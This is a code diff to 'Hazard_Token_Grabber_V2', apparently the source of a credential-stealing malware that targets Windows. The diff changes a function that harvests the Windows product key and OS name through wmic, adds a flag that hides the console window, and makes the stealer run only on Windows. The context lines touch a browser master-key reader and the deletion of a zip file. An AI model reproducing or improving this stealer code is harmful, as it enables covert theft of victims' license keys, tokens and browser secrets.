@@ -150,42 +150,14 @@ class Hazard_Token_Grabber_V2:
                         l = Replacement
                 f.writelines(l)
 
-    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
-        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+    def getProductKey(self):
+        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", creationflags=0x08000000, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
         wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
+        process2 = subprocess.Popen("wmic os get Caption", creationflags=0x08000000, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+        productName = process2.communicate()[0].decode().strip("Caption\n").strip()
         if not wkey:
-            def strToInt(x):
-                if isinstance(x, str):
-                    return ord(x)
-                return x
-            chars = 'BCDFGHJKMPQRTVWXY2346789'
-            wkey = ''
-            offset = 52
-            regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
-            productName, _ = winreg.QueryValueEx(regkey, "ProductName")
-            try:
-                val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
-                key = list(val)
-    
-                for i in range(24,-1, -1):
-                    temp = 0
-                    for j in range(14,-1,-1):
-                        temp *= 256
-                        try:
-                            temp += strToInt(key[j+ offset])
-                        except IndexError:
-                            return [productName, "No Key Extracted"]
-                        if temp / 24 <= 255:
-                            key[j+ offset] = temp/24
-                        else:
-                            key[j+ offset] = 255
-                        temp = int(temp % 24)
-                    wkey = chars[temp] + wkey
-                for i in range(5,len(wkey),6):
-                    wkey = wkey[:i] + '-' + wkey[i:]
-                return [productName, wkey]
-            except Exception:
-                return [productName, "No Key Extracted"]
+            return [productName, "No Key Extracted"]
+        return [productName, wkey]
 
     def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
@@ -456,4 +428,4 @@ class Hazard_Token_Grabber_V2:
         os.remove(_zipfile)
 
 if __name__ == "__main__":
-    Hazard_Token_Grabber_V2()
+    if os.name == "nt": Hazard_Token_Grabber_V2()
